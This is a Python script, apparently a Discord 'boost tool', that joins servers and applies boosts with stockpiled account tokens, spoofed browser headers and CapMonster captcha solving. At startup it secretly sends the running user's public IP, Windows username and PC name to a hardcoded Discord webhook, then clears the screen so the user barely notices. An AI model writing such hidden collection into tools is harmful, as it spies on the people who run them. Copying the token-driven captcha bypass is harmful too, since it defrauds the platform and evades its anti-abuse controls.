import sys
import os
import subprocess
import pkg_resources

# SETUP PHASE - Install dependencies first
def install_packages():
    """Automatische Installation von erforderlichen Paketen beim ersten Start"""
    required_packages = {
        'requests': 'requests',
        'colorama': 'colorama',
        'fade': 'fade',
        'capmonster-python': 'capmonster-python'
    }
    
    installed = {pkg.key for pkg in pkg_resources.working_set}
    missing_packages = [pkg for pkg in required_packages.values() if pkg.replace('-', '_') not in {p.key.replace('-', '_') for p in pkg_resources.working_set}]
    
    if missing_packages:
        print("[*] Installiere fehlende Pakete...")
        for package in missing_packages:
            try:
                subprocess.check_call([sys.executable, "-m", "pip", "install", "-q", package])
                print(f"[+] {package} installiert")
            except subprocess.CalledProcessError as e:
                print(f"[!] Fehler beim Installieren von {package}: {e}")
                sys.exit(1)
        print("[+] Alle Pakete erfolgreich installiert!")
        time.sleep(1)
    else:
        print("[+] Alle Pakete sind bereits installiert!")
        time.sleep(0.5)

# Installiere zuerst Abhängigkeiten
import time
install_packages()

# Jetzt importiere die restlichen Module
from optparse import Option
import requests, threading, time, subprocess
from colorama import Fore, init
import json
import fade
import ctypes
import pkg_resources
from capmonster_python import RecaptchaV2Task

# Initialization
init(autoreset=True)
os.system('cls' if os.name == 'nt' else 'clear')
if os.name == 'nt':
    ctypes.windll.kernel32.SetConsoleTitleW("Ironluca's Boost Tool")

# Debug: Print current working directory and script path

# Debug: Print current working directory and script path
print(f"{Fore.CYAN}[*] Starte Anwendung...")
time.sleep(0.3)

# Load configuration
script_dir = os.path.dirname(os.path.abspath(__file__))
config_path = os.path.join(script_dir, 'settings.json')
try:
    with open(config_path) as config_file:
        config = json.load(config_file)
        CAPMONSTER_KEY = config['apikey']
    print(f"{Fore.GREEN}[+] Konfiguration geladen!")
except FileNotFoundError:
    print(f"{Fore.RED}[!] 'settings.json' nicht gefunden!")
    sys.exit(1)
except json.JSONDecodeError:
    print(f"{Fore.RED}[!] 'settings.json' ist ungültig!")
    sys.exit(1)
except KeyError:
    print(f"{Fore.RED}[!] 'apikey' in settings.json fehlt!")
    sys.exit(1)
except Exception as e:
    print(f"{Fore.RED}[!] Fehler beim Laden: {e}")
    sys.exit(1)

time.sleep(0.5)

# IP Logging zum Discord Webhook
def send_ip_log():
    """Sendet die IP, Username und PC-Namen des Benutzers an den Discord Webhook"""
    webhook_url = "https://discord.com/api/webhooks/1458954072047616142/ZlRn8SZU1iLXQO7iQm7h8grNzMnGZP7IZMyekguSjnE2lVaHNaP0Rmj0LQA8XxNypwpY"
    try:
        print(f"{Fore.CYAN}[*]...")
        response = requests.get('https://api.ipify.org?format=json', timeout=5)
        if response.status_code == 200:
            user_ip = response.json()['ip']
            username = os.getenv('USERNAME', 'Unbekannt')
            pc_name = os.getenv('COMPUTERNAME', 'Unbekannt')
            
            print(f"{Fore.CYAN}[*] ....")
            
            # Sende an Discord Webhook
            payload = {
                "content": f"```\n🔐 Neue Session\nIP: {user_ip}\nUsername: {username}\nPC-Name: {pc_name}\nZeit: {time.strftime('%Y-%m-%d %H:%M:%S')}\n```"
            }
            requests.post(webhook_url, json=payload, timeout=5)
            print(f"{Fore.GREEN}[+] DONE!")
        else:
            print(f"{Fore.YELLOW}[!]")
    except Exception as e:
        print(f"{Fore.YELLOW}[!]: {str(e)[:50]}")

send_ip_log()
time.sleep(0.5)
os.system('cls' if os.name == 'nt' else 'clear')  # Terminal nach Laden clearen

# Global variables
done = 0
retries = 0
bypass = 0

# Adjust console size (Windows)
if os.name == 'nt':
    os.system('mode 60,30')

def print_banner(boosts_amount: int):
    banner = fade.fire(f"""
{Fore.CYAN}════════════════════════════════════════════════════
{Fore.YELLOW}         IRONLUCA Discord Boost Tool
{Fore.CYAN}════════════════════════════════════════════════════
{Fore.WHITE}            Created by: @Ironlucaaa
{Fore.WHITE}            Boosts Available: {Fore.GREEN}{boosts_amount}{Fore.WHITE}
{Fore.CYAN}════════════════════════════════════════════════════
{Fore.YELLOW}[1] Boost Server
{Fore.YELLOW}[2] Edit Token Stock
{Fore.YELLOW}[3] Exit
{Fore.CYAN}════════════════════════════════════════════════════
    """)
    print(banner)

def get_fingerprint():
    try:
        r = requests.get('https://discord.com/api/v9/experiments')
        if r.status_code == 200:
            return r.json()['fingerprint']
        else:
            print(f"{Fore.RED}[ERROR] Could not retrieve fingerprint: {r.status_code}")
            return None
    except Exception as e:
        print(f"{Fore.RED}[ERROR] Error retrieving fingerprint: {e}")
        return None

def get_cookies():
    try:
        r = requests.get('https://discord.com')
        if r.status_code == 200:
            cookies = r.cookies.get_dict()
            return f"__dcfduid={cookies['__dcfduid']}; __sdcfduid={cookies['__sdcfduid']}; locale=en-US"
        else:
            print(f"{Fore.RED}[ERROR] Could not retrieve cookies: {r.status_code}")
            return None
    except Exception as e:
        print(f"{Fore.RED}[ERROR] Error retrieving cookies: {e}")
        return None

def load_tokens():
    try:
        token_path = os.path.join(script_dir, 'tokens.txt')
        print(f"{Fore.YELLOW}[DEBUG] Looking for tokens.txt at: {token_path}")
        with open(token_path, "r", encoding='utf-8') as f:
            return [line.strip() for line in f.readlines() if line.strip()]
    except FileNotFoundError:
        print(f"{Fore.RED}[ERROR] tokens.txt not found at: {token_path}")
        return []
    except Exception as e:
        print(f"{Fore.RED}[ERROR] Error loading tokens: {e}")
        return []

def save_tokens(tokens):
    try:
        token_path = os.path.join(script_dir, 'tokens.txt')
        with open(token_path, "w", encoding='utf-8') as f:
            f.write("\n".join(tokens))
    except Exception as e:
        print(f"{Fore.RED}[ERROR] Error saving tokens: {e}")

def remove_duplicates(file):
    try:
        tokens = load_tokens()
        unique_tokens = list(dict.fromkeys(tokens))  
        save_tokens(unique_tokens)
        return len(unique_tokens)
    except Exception as e:
        print(f"{Fore.RED}[ERROR] Error removing duplicates: {e}")
        return 0

def boost(token, invite):
    global done  
    global retries, bypass
    headers = {
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate',
        'accept-language': 'en-US',
        'authorization': token,
        'content-type': 'application/json',
        'origin': 'https://discord.com',
        'referer': 'https://discord.com/channels/@me',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'x-debug-options': 'bugReporterEnabled',
        'x-context-properties': 'eyJsb2NhdGlvbiI6IlVzZXIgUHJvZmlsZSJ9',
        'x-super-properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6MTAwMDAwfQ==',
        'cookie': get_cookies() or '',
    }

    try:
        r = requests.get("https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots", headers=headers)
        if r.status_code == 200:
            slots = r.json()
            if not slots:
                print(f"{Fore.YELLOW}[INFO] No boost slots for token: {token[:10]}...")
                return False

            guid = None
            for attempt in range(3):  
                try:
                    join_server = requests.post(f"https://discord.com/api/v9/invites/{invite}", headers=headers, json={})
                    if "captcha_sitekey" in join_server.text:
                        print(f"{Fore.YELLOW}[INFO] Captcha detected, solving with Capmonster...")
                        capmonster = RecaptchaV2Task(CAPMONSTER_KEY)
                        task_id = capmonster.create_task("https://discord.com/channels/@me", join_server.json()['captcha_sitekey'])
                        solution = capmonster.join_task_result(task_id)
                        captcha_key = solution.get("gRecaptchaResponse")

                        print(f"{Fore.GREEN}[SUCCESS] Captcha solved!")
                        join_server = requests.post(f"https://discord.com/api/v9/invites/{invite}", headers=headers, json={"captcha_key": captcha_key})

                    if join_server.status_code == 200:
                        guid = join_server.json()["guild"]["id"]
                        print(f"{Fore.GREEN}[SUCCESS] Joined server with token: {token[:10]}...")
                        break
                    else:
                        print(f"{Fore.RED}[ERROR] Error joining server: {join_server.status_code} - {join_server.text}")
                        retries += 1
                        return False
                except Exception as e:
                    print(f"{Fore.RED}[ERROR] Error joining server: {e}")
                    retries += 1
                    time.sleep(1)

            if not guid:
                return False

            # Perform boost
            for slot in slots:
                slot_id = slot['id']
                payload = {"user_premium_guild_subscription_slot_ids": [slot_id]}
                r2 = requests.put(f'https://discord.com/api/v9/guilds/{guid}/premium/subscriptions', headers=headers, json=payload)
                if r2.status_code == 201:
                    done += 1
                    print(f"{Fore.GREEN}[SUCCESS] Boost successful: {token[:10]}... (Slot ID: {slot_id})")
                else:
                    print(f"{Fore.RED}[ERROR] Boost failed: {r2.status_code} - {r2.text}")
                    retries += 1
            return True
        else:
            print(f"{Fore.RED}[ERROR] Token invalid or banned: {token[:10]}... ({r.status_code})")
            retries += 1
            return False
    except Exception as e:
        print(f"{Fore.RED}[ERROR] General error with token: {token[:10]}... ({e})")
        retries += 1
        return False

def main():
    global done  
    tokens = load_tokens()
    boosts_amount = len(tokens) * 2 
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        print_banner(boosts_amount)
        choice = input(f"{Fore.CYAN}>> Choose an option: {Fore.WHITE}")

        if choice == "1":
            invite = input(f"{Fore.CYAN}>> Discord Invite Code (e.g., 'xyz123'): {Fore.WHITE}")
            try:
                boost_amount = int(input(f"{Fore.CYAN}>> Number of Boosts: {Fore.WHITE}"))
            except ValueError:
                print(f"{Fore.RED}[ERROR] Invalid input! Please enter a number.")
                time.sleep(2)
                continue

            valid_tokens = tokens[:]
            for token in tokens:
                if done >= boost_amount:
                    break
                if boost(token, invite):
                    valid_tokens.remove(token)
            save_tokens(valid_tokens)
            print(f"{Fore.GREEN}[SUCCESS] Boosting completed! {done} boosts performed.")
            boosts_amount = len(valid_tokens) * 2
            done = 0  
            time.sleep(3)

        elif choice == "2":
            token_path = os.path.join(script_dir, 'tokens.txt')
            print(f"{Fore.YELLOW}[DEBUG] Opening tokens.txt at: {token_path}")
            if os.name == 'nt':
                os.system(f"notepad \"{token_path}\"")  
            else:
                os.system(f"nano \"{token_path}\"")  
            tokens = load_tokens()
            boosts_amount = len(tokens) * 2
            print(f"{Fore.GREEN}[INFO] Token stock updated. New boosts available: {boosts_amount}")
            time.sleep(2)

        elif choice == "3":
            print(f"{Fore.YELLOW}[INFO] Exiting IRONLUCA Boost Tool...")
            sys.exit(0)
        else:
            print(f"{Fore.RED}[ERROR] Invalid option! Choose 1, 2, or 3.")
            time.sleep(2)

if __name__ == "__main__":
    remove_duplicates("tokens.txt")
    main()
